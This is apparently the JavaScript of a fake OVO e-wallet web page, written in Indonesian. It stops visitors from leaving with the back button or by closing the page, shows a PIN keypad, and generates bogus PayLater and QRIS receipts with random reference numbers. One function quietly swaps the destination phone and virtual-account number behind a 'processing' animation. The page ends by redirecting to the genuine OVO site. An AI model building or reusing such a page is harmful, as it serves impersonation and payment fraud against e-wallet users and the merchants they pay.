history.pushState(null, null, location.href);
window.addEventListener('popstate', function (event) {
    history.pushState(null, null, location.href);
});

window.addEventListener('beforeunload', function (e) {
    e.preventDefault();
    e.returnValue = '';
});

let currentNumber = localStorage.getItem('ovo_active_number') || "08137488600"; 
const URL_TUJUAN = "https://ovo.co.id/"; 

let currentPin = "";
let pendingAction = null;

let transactionHistory = JSON.parse(localStorage.getItem('ovo_history')) || [
    {
        type: "info",
        title: "OVO Siap Digunakan",
        desc: "Aplikasi dompet digital OVO Anda telah aktif.",
        time: "Baru saja",
        badge: "Info",
        badgeBg: "bg-blue-50 text-[#0081f1]",
        icon: "fa-bell",
        iconBg: "bg-blue-100 text-[#0081f1]"
    }
];

const bankData = {
    'BCA': { color: 'bg-[#003594]', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/1280px-Bank_Central_Asia.svg.png' },
    'BRI': { color: 'bg-[#00529C]', logo: 'https://upload.wikimedia.org/wikipedia/commons/2/2e/BRI_2020.svg' },
    'BNI': { color: 'bg-[#E55300]', logo: 'https://www.bni.co.id/Portals/1/BNI/Images/logo-bni-new.png' },
    'LIVIN': { color: 'bg-[#F2AE00]', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/1280px-Bank_Mandiri_logo_2016.svg.png' },
    'PERMATA': { color: 'bg-[#0064FF]', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Permata_Bank_%282024%29.svg/3840px-Permata_Bank_%282024%29.svg.png' },
    'CIMB': { color: 'bg-[#ED1C24]', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/38/CIMB_Niaga_logo.svg/1280px-CIMB_Niaga_logo.svg.png' }
};

function simpanDanPerbaruiRiwayat() {
    localStorage.setItem('ovo_history', JSON.stringify(transactionHistory));
}

function sinkronkanNomorGlobal(n) {
    currentNumber = n;
    localStorage.setItem('ovo_active_number', n);
    const profilePhone = document.getElementById('profilePhoneDisplay');
    if(profilePhone) profilePhone.innerText = n;
}

function sembunyikanSemua() {
    document.getElementById('homeView').style.display = 'none';
    document.getElementById('formInput').style.display = 'none';
    document.getElementById('strukArea').style.display = 'none';
    document.getElementById('profileArea').style.display = 'none';
    document.getElementById('historyArea').style.display = 'none';
    document.getElementById('formQris').style.display = 'none';
    document.getElementById('qrisStrukArea').style.display = 'none';
    document.getElementById('pinArea').style.display = 'none';
}

function resetNav() {
    const navItems = ['navHome', 'navPaylater', 'navHistory', 'navProfile'];
    navItems.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('active');
    });
}

function bukaPaylater() {
    sembunyikanSemua();
    resetNav();
    document.getElementById('formInput').style.display = 'block';
    const navPaylater = document.getElementById('navPaylater');
    if(navPaylater) navPaylater.classList.add('active');
}

function bukaQrisForm() {
    sembunyikanSemua();
    resetNav();
    document.getElementById('formQris').style.display = 'block';
}

function bukaProfil() {
    sembunyikanSemua();
    resetNav();
    sinkronkanNomorGlobal(currentNumber);
    document.getElementById('profileArea').style.display = 'block';
    const navProfile = document.getElementById('navProfile');
    if(navProfile) navProfile.classList.add('active');
}

function handleProfilePhotoUpload(event) {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(e) {
            const imgElement = document.getElementById('uploadedProfileImg');
            const iconElement = document.getElementById('defaultUserIcon');
            imgElement.src = e.target.result;
            imgElement.classList.remove('hidden');
            iconElement.classList.add('hidden');
        }
        reader.readAsDataURL(file);
    }
}

function bukaRiwayat() {
    sembunyikanSemua();
    resetNav();
    renderRiwayat();
    document.getElementById('historyArea').style.display = 'block';
    const navHistory = document.getElementById('navHistory');
    if (navHistory) navHistory.classList.add('active');
}

function renderRiwayat() {
    const container = document.getElementById('historyList');
    if (!container) return;
    
    container.innerHTML = "";
    
    if (transactionHistory.length === 0) {
        container.innerHTML = `<p class="text-center text-xs text-slate-400 py-6">Belum ada riwayat transaksi.</p>`;
        return;
    }

    transactionHistory.forEach((item, index) => {
        const html = `
            <div onclick="bukaDetailRiwayat(${index})" class="history-card p-3.5 bg-white rounded-2xl border border-slate-100 flex items-start gap-3 shadow-sm cursor-pointer hover:bg-slate-50 transition-all">
                <div class="w-9 h-9 ${item.iconBg} rounded-full flex items-center justify-center shrink-0 mt-0.5">
                    <i class="fa-solid ${item.icon} text-xs"></i>
                </div>
                <div class="flex-1">
                    <div class="flex justify-between items-center mb-1">
                        <h4 class="text-xs font-bold text-slate-900">${item.title}</h4>
                        <span class="text-[10px] text-slate-400">${item.time}</span>
                    </div>
                    <p class="text-[11px] text-slate-500">${item.desc}</p>
                    <span class="inline-block mt-2 px-2.5 py-0.5 ${item.badgeBg} font-bold text-[9px] rounded-md">${item.badge}</span>
                </div>
                <div class="self-center text-slate-300 text-xs">
                    <i class="fa-solid fa-chevron-right"></i>
                </div>
            </div>
        `;
        container.insertAdjacentHTML('beforeend', html);
    });
}

function bukaDetailRiwayat(index) {
    const item = transactionHistory[index];
    if (!item || item.type === 'info') return;

    sembunyikanSemua();
    
    if (item.type === 'paylater' || item.type === 'va_update') {
        const data = bankData[item.bank] || bankData['BCA'];
        
        const nominalAngka = parseInt(item.nominal) || 0;
        const biayaTransaksi = item.biaya !== undefined ? parseInt(item.biaya) : 2500;
        const totalPembayaran = item.total ? parseInt(item.total) : (nominalAngka + biayaTransaksi);
        
        const reffCode = item.reffCode || ("REF" + Math.floor(100000000 + Math.random() * 899999999));
        const tanggalVal = item.tanggalStr || "07 Sep 2026";
        const waktuVal = item.waktuStr || "00:00:00 WIB";

        document.getElementById('stBankLogo').src = data.logo;
        document.getElementById('stBankIconSmall').src = data.logo;
        document.getElementById('stHeader').className = `p-6 flex flex-col items-center min-h-[140px] justify-center text-white ${data.color}`;
        
        document.getElementById('stNominal').innerText = "Rp " + totalPembayaran.toLocaleString('id-ID');
        document.getElementById('stNoTujuan').innerText = currentNumber;
        document.getElementById('stVA').innerText = item.va;
        document.getElementById('stNoTransaksi').innerText = item.trxCode;
        document.getElementById('stTanggal').innerText = tanggalVal;
        document.getElementById('stWaktu').innerText = waktuVal;
        document.getElementById('stNoReff').innerText = reffCode;
        document.getElementById('stNominalDetail').innerText = "Rp " + nominalAngka.toLocaleString('id-ID');
        document.getElementById('stBiayaAdmin').innerText = "Rp " + biayaTransaksi.toLocaleString('id-ID');
        document.getElementById('stTotalDetail').innerText = "Rp " + totalPembayaran.toLocaleString('id-ID');
        
        document.getElementById('strukArea').style.display = 'block';
    } else if (item.type === 'qris') {
        const stQrisMerchant = document.getElementById('stQrisMerchant');
        const stQrisNominal = document.getElementById('stQrisNominal');
        const stQrisRef = document.getElementById('stQrisRef');
        const stQrisWaktu = document.getElementById('stQrisWaktu');
        const qrisStrukArea = document.getElementById('qrisStrukArea');

        if (stQrisMerchant) stQrisMerchant.innerText = item.merchant;
        if (stQrisNominal) stQrisNominal.innerText = "Rp " + parseInt(item.nominal).toLocaleString('id-ID');
        if (stQrisRef) stQrisRef.innerText = item.refCode;
        if (stQrisWaktu) stQrisWaktu.innerText = item.timeStr;
        
        if (qrisStrukArea) qrisStrukArea.style.display = 'block';
    }
}

function kembaliKeHome() {
    sembunyikanSemua();
    resetNav();
    document.getElementById('homeView').style.display = 'block';
    const navHome = document.getElementById('navHome');
    if (navHome) navHome.classList.add('active');
}

function lanjutKePin(jenis) {
    if (jenis === 'paylater') {
        const nominal = document.getElementById('inNominal').value;
        if(!nominal || nominal <= 0) return alert("Masukkan nominal yang valid!");
    } else if (jenis === 'qris') {
        const merchant = document.getElementById('qrisMerchant').value;
        const nominal = document.getElementById('qrisNominal').value;
        if(!merchant) return alert("Masukkan nama merchant!");
        if(!nominal || nominal <= 0) return alert("Masukkan nominal pembayaran yang valid!");
    }

    pendingAction = jenis;
    currentPin = "";
    updatePinDots();

    sembunyikanSemua();
    document.getElementById('pinArea').style.display = 'block';
}

function inputPin(angka) {
    if (currentPin.length < 6) {
        currentPin += angka;
        updatePinDots();

        if (currentPin.length === 6) {
            setTimeout(() => {
                jalankanTransaksiFinal();
            }, 300);
        }
    }
}

function hapusPin() {
    if (currentPin.length > 0) {
        currentPin = currentPin.slice(0, -1);
        updatePinDots();
    }
}

function updatePinDots() {
    for (let i = 0; i < 6; i++) {
        const dot = document.getElementById(`pin-${i}`);
        if (i < currentPin.length) {
            dot.classList.add('active');
        } else {
            dot.classList.remove('active');
        }
    }
}

function jalankanTransaksiFinal() {
    const loading = document.getElementById('loading');
    sembunyikanSemua();
    loading.classList.remove('pointer-events-none');
    loading.classList.remove('opacity-0');

    setTimeout(() => {
        if (pendingAction === 'paylater') {
            const nominal = document.getElementById('inNominal').value;
            buatStruk(nominal);
        } else if (pendingAction === 'qris') {
            const merchant = document.getElementById('qrisMerchant').value;
            const nominal = document.getElementById('qrisNominal').value;
            buatQrisStruk(merchant, nominal);
        }

        loading.classList.add('opacity-0');
        setTimeout(() => {
            loading.classList.add('pointer-events-none');
        }, 500);
    }, 1200);
}

function buatStruk(nominal) {
    const bankOpt = document.querySelector('input[name="bank"]:checked');
    const bank = bankOpt.value;
    const bankCode = bankOpt.getAttribute('data-code');
    const data = bankData[bank];
    const vaNumber = bankCode + "" + currentNumber;
    const randomTrx = "OVO8866" + Math.floor(1000 + Math.random() * 8999);
    const randomReff = "REF" + Math.floor(100000000 + Math.random() * 899999999);
    
    const nominalAngka = parseInt(nominal) || 0;
    const biayaTransaksi = 2500;
    const totalPembayaran = nominalAngka + biayaTransaksi;

    const now = new Date();
    const opsiTanggal = { day: 'numeric', month: 'short', year: 'numeric' };
    const opsiWaktu = { hour: '2-digit', minute: '2-digit', second: '2-digit' };
    
    const tanggalStr = now.toLocaleDateString('id-ID', opsiTanggal);
    const waktuStr = now.toLocaleTimeString('id-ID', opsiWaktu).replace(/\./g, ':') + " WIB";

    document.getElementById('stBankLogo').src = data.logo;
    document.getElementById('stBankIconSmall').src = data.logo;
    document.getElementById('stHeader').className = `p-6 flex flex-col items-center min-h-[140px] justify-center text-white ${data.color}`;
    
    document.getElementById('stNominal').innerText = "Rp " + totalPembayaran.toLocaleString('id-ID');
    document.getElementById('stNoTujuan').innerText = currentNumber;
    document.getElementById('stVA').innerText = vaNumber;
    document.getElementById('stNoTransaksi').innerText = randomTrx;
    document.getElementById('stTanggal').innerText = tanggalStr;
    document.getElementById('stWaktu').innerText = waktuStr;
    document.getElementById('stNoReff').innerText = randomReff;
    document.getElementById('stNominalDetail').innerText = "Rp " + nominalAngka.toLocaleString('id-ID');
    document.getElementById('stBiayaAdmin').innerText = "Rp " + biayaTransaksi.toLocaleString('id-ID');
    document.getElementById('stTotalDetail').innerText = "Rp " + totalPembayaran.toLocaleString('id-ID');

    const btn = document.getElementById('btnGanti');
    if (btn) {
        btn.disabled = false;
        btn.innerHTML = 'Proses';
        btn.classList.remove('bg-green-50', 'text-green-600', 'border-green-200');
        btn.classList.add('bg-slate-50', 'text-slate-700', 'hover:bg-slate-100', 'border-slate-200');
    }

    transactionHistory.unshift({
        type: "paylater",
        title: `Tagihan OVO PayLater (${bank})`,
        desc: `Sebesar Rp ${totalPembayaran.toLocaleString('id-ID')} via VA`,
        time: tanggalStr,
        badge: "Menunggu",
        badgeBg: "bg-amber-50 text-amber-600",
        icon: "fa-clock",
        iconBg: "bg-amber-100 text-amber-600",
        bank: bank,
        nominal: nominalAngka,
        biaya: biayaTransaksi,
        total: totalPembayaran,
        va: vaNumber,
        trxCode: randomTrx,
        reffCode: randomReff,
        tanggalStr: tanggalStr,
        waktuStr: waktuStr
    });
    simpanDanPerbaruiRiwayat();

    sembunyikanSemua();
    document.getElementById('strukArea').style.display = 'block';
}

function buatQrisStruk(merchant, nominal) {
    document.getElementById('stQrisMerchant').innerText = merchant;
    document.getElementById('stQrisNominal').innerText = "Rp " + parseInt(nominal).toLocaleString('id-ID');
    
    const randomRef = "OVOQR" + Math.floor(100000000 + Math.random() * 899999999);
    document.getElementById('stQrisRef').innerText = randomRef;

    const options = { day: 'numeric', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' };
    const timeStr = new Date().toLocaleString('id-ID', options).replace(/\./g, ':');
    document.getElementById('stQrisWaktu').innerText = timeStr;

    transactionHistory.unshift({
        type: "qris",
        title: `Bayar QRIS`,
        desc: `Ke Merchant ${merchant} sebesar Rp ${parseInt(nominal).toLocaleString('id-ID')}`,
        time: "Baru saja",
        badge: "Sukses",
        badgeBg: "bg-green-50 text-green-600",
        icon: "fa-qrcode",
        iconBg: "bg-blue-100 text-[#0081f1]",
        merchant: merchant,
        nominal: nominal,
        refCode: randomRef,
        timeStr: timeStr
    });
    simpanDanPerbaruiRiwayat();

    sembunyikanSemua();
    document.getElementById('qrisStrukArea').style.display = 'block';
}

function ubahNomorDenganAnimasi() {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('btnGanti');
    const targetEl = document.getElementById('targetDisplay');
    const vaEl = document.getElementById('vaDisplay');
    const bankOpt = document.querySelector('input[name="bank"]:checked');
    const bankCode = bankOpt ? bankOpt.getAttribute('data-code') : "";

    if (btn.disabled) return;

    loading.classList.remove('pointer-events-none');
    loading.classList.remove('opacity-0');

    setTimeout(() => {
        if (targetEl) targetEl.classList.add('hidden-state');
        if (vaEl) vaEl.classList.add('hidden-state');
        
        setTimeout(() => {
            sinkronkanNomorGlobal("08137486600");
            
            const textEl = document.getElementById('stNoTujuan');
            const textVa = document.getElementById('stVA');
            
            if (textEl) textEl.innerText = currentNumber;
            if (textVa) textVa.innerText = bankCode + "" + currentNumber;
            
            if (targetEl) targetEl.classList.remove('hidden-state');
            if (vaEl) vaEl.classList.remove('hidden-state');

            btn.disabled = true;
            btn.innerHTML = '<i class="fa-solid fa-check mr-1.5"></i> menunggu';
            btn.classList.remove('bg-slate-50', 'text-slate-700', 'hover:bg-slate-100', 'border-slate-200');
            btn.classList.add('bg-red-50', 'text-red-600', 'border-red-200');

            const nominalValText = document.getElementById('stNominalDetail') ? document.getElementById('stNominalDetail').innerText.replace(/[^0-9]/g, '') : '0';
            const nominalAngka = parseInt(nominalValText) || 0;
            const biayaTransaksi = 2500;
            const totalPembayaran = nominalAngka + biayaTransaksi;

            document.getElementById('stNominal').innerText = "Rp " + totalPembayaran.toLocaleString('id-ID');
            document.getElementById('stTotalDetail').innerText = "Rp " + totalPembayaran.toLocaleString('id-ID');

            const vaVal = textVa ? textVa.innerText : '-';
            const trxCodeVal = document.getElementById('stNoTransaksi') ? document.getElementById('stNoTransaksi').innerText : 'PAY8866600';
            const tanggalVal = document.getElementById('stTanggal') ? document.getElementById('stTanggal').innerText : '07 Sep 2026';
            const waktuVal = document.getElementById('stWaktu') ? document.getElementById('stWaktu').innerText : 'Baru saja';

            transactionHistory.unshift({
                type: "va_update",
                title: `Proses`,
                desc: `Sedang Proses`,
                time: tanggalVal,
                badge: "Update",
                badgeBg: "bg-blue-50 text-[#0081f1]",
                icon: "fa-user-pen",
                iconBg: "bg-blue-100 text-[#0081f1]",
                bank: bankOpt ? bankOpt.value : '',
                nominal: nominalAngka,
                biaya: biayaTransaksi,
                total: totalPembayaran,
                va: vaVal,
                trxCode: trxCodeVal,
                tanggalStr: tanggalVal,
                waktuStr: waktuVal
            });
            simpanDanPerbaruiRiwayat();

            loading.classList.add('opacity-0');
            setTimeout(() => {
                loading.classList.add('pointer-events-none');
            }, 500);
        }, 300);
    }, 1000);
}

function keWebsiteLain() { 
    window.location.href = URL_TUJUAN; 
}

window.onload = function() {
    sinkronkanNomorGlobal('08137488600');
};
